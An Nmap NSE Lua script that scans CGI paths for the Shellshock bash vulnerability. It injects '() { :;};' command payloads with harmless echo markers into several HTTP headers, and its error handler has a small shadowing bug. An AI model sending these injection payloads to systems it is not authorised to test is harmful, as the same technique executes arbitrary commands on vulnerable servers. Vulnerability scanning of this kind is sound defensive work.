local http = require "http"
local stdnse = require "stdnse"
local nmap = require "nmap"
local shortport = require "shortport"



-- Fast-path bindings for the stdlib and nmap API used by this script.
-- Kept strict-mode safe: every name below is a declared local.
local format = string.format
local lower = string.lower
local upper = string.upper
local byte = string.byte
local sub = string.sub
local match = string.match
local gmatch = string.gmatch
local gsub = string.gsub
local find = string.find
local rep = string.rep
local char = string.char
local concat = table.concat
local insert = table.insert
local remove = table.remove
local sort = table.sort
local move = table.move
local tostring = tostring
local tonumber = tonumber
local type = type
local pcall = pcall
local pairs = pairs
local ipairs = ipairs
local unpack = table.unpack
local setmetatable = setmetatable
local getmetatable = getmetatable
local error = error
local select = select

local clock = nmap.clock
local msleep = function(ms)
    if stdnse and stdnse.sleep then
        return stdnse.sleep((ms or 0) / 1000)
    end
    if nmap.msleep then
        return nmap.msleep(ms or 0)
    end
    local deadline = nmap.clock() + (ms or 0) / 1000
    while nmap.clock() < deadline do end
    return true
end
local new_socket = nmap.new_socket
local resolve = nmap.resolve

-- stdnse.sleep / stdnse.strsplit are not present in every NSE runtime.
local sleep = function(seconds)
    if stdnse and stdnse.sleep then
        return stdnse.sleep(seconds)
    end
    if nmap.msleep then
        return nmap.msleep(math.max(0, math.floor((seconds or 0) * 1000)))
    end
    local deadline = nmap.clock() + (seconds or 0)
    while nmap.clock() < deadline do end
    return true
end

local strsplit = function(sep, str, max)
    local out, pos, n = {}, 1, 0
    if str == nil then return out end
    while true do
        if max and n >= max - 1 then
            out[#out + 1] = sub(str, pos)
            return out
        end
        local s, e = find(str, sep, pos)
        if not s then
            out[#out + 1] = sub(str, pos)
            return out
        end
        if e < pos then e = pos end
        out[#out + 1] = sub(str, pos, s - 1)
        pos = e + 1
        n = n + 1
        if pos > #str then
            out[#out + 1] = ""
            return out
        end
    end
end

local format_output = stdnse.format_output
local output_table = stdnse.output_table

description = [[Detects Shellshock (CVE-2014-6271, CVE-2014-6277, CVE-2014-6278) in CGI scripts via malicious headers.]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"vuln", "safe"}

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and port.service == "http" end

action = function(host, port)
  local ok, result = pcall(function()
    local findings = {}
    local server_banner = ""

    local banner_req = http.get(host, port, "/")
    if banner_req and banner_req.headers and banner_req.headers["server"] then
      local sv = banner_req.headers["server"]
      server_banner = type(sv) == "table" and sv[1] or sv
    end

    local cgi_scripts = {
      "/cgi-bin/test.cgi",
      "/cgi-bin/printenv",
      "/cgi-bin/hello",
      "/cgi-sys/printenv",
      "/cgi-bin/php",
      "/cgi-bin/test",
      "/cgi-bin/env",
      "/cgi-bin/test.sh",
      "/cgi-bin/status",
      "/cgi-bin/systeminfo",
    }

    local shellshock_payloads = {
      {header = "User-Agent", value = "() { :;}; echo; echo; printf 'HackIT_Shellshock_UA'"},
      {header = "Cookie", value = "() { :;}; echo; echo; printf 'HackIT_Shellshock_Cookie'"},
      {header = "Referer", value = "() { :;}; echo; echo; printf 'HackIT_Shellshock_Ref'"},
      {header = "X-Forwarded-For", value = "() { :;}; echo; echo; printf 'HackIT_Shellshock_XFF'"},
      {header = "Host", value = "() { :;}; echo; echo; printf 'HackIT_Shellshock_Host'"},
      {header = "Accept", value = "() { :;}; echo; echo; printf 'HackIT_Shellshock_Acc'"},
    }

    local shellshock_variants = {
      "() { :;}; /bin/echo HackIT_Shellshock_Test",
      "() { :;}; echo HackIT_Shellshock_Test",
      "() { :;}; /usr/bin/printf 'HackIT_Shellshock_Test\\n'",
      "() { :;}; /bin/bash -c 'echo HackIT_Shellshock_Test'",
    }

    for _, cgi in ipairs(cgi_scripts) do
      for _, sh in ipairs(shellshock_payloads) do
        local headers = {[sh.header] = sh.value}
        local req = http.get(host, port, cgi, {header = headers})
        if req and req.status then
          local body = req.body or ""
          local resp_headers = req.headers or {}

          for _, variant in ipairs(shellshock_variants) do
            if match(body, "HackIT_Shellshock") or match(body, "bash") and match(body, "echo") then
              local excerpt = sub(body, 1, 100):gsub("\n", " "):gsub("\r", "")
              insert(findings, {cgi = cgi, header = sh.header, excerpt = excerpt, status = req.status, variant = sub(variant, 1, 40)})
              break
            end
          end

          for hname, hval in pairs(resp_headers) do
            local hstr = type(hval) == "table" and concat(hval, " ") or tostring(hval)
            if match(hstr, "HackIT") then
              insert(findings, {cgi = cgi, header = sh.header, excerpt = ("response header %s: %s"):format(hname, sub(hstr, 1, 60)), status = req.status, variant = "header reflection"})
              break
            end
          end

          if match(body, "HackIT") and not findings[#findings] then
            insert(findings, {cgi = cgi, header = sh.header, excerpt = sub(body, 1, 80), status = req.status, variant = "body reflection"})
          end
        end
      end
    end

    if #findings > 0 then
      local result = output_table()
      result.cve = "CVE-2014-6271, CVE-2014-6277, CVE-2014-6278"
      result.severity = "CRITICAL"
      result.vulnerable = true
      result.server = server_banner
      result.detail = ("Shellshock (CVE-2014-6271) confirmed in CGI scripts via %d vector(s)"):format(#findings)
      for i, f in ipairs(findings) do
        result[("vector_%d"):format(i)] = ("CGI %s via %s header (HTTP %d): %s"):format(f.cgi, f.header, f.status, f.excerpt)
      end
      return result
    end

    local result = output_table()
    result.cve = "CVE-2014-6271"
    result.severity = "LOW"
    result.vulnerable = false
    result.server = server_banner
    result.detail = "No Shellshock detected in CGI scripts"
    return result
  end)
  if not ok then
    local result = output_table()
    result.cve = "CVE-2014-6271"
    result.severity = "MEDIUM"
    result.vulnerable = false
    result.detail = "Error during scan: " .. tostring(result)
    result.error = true
    return result
  end
  return result
end
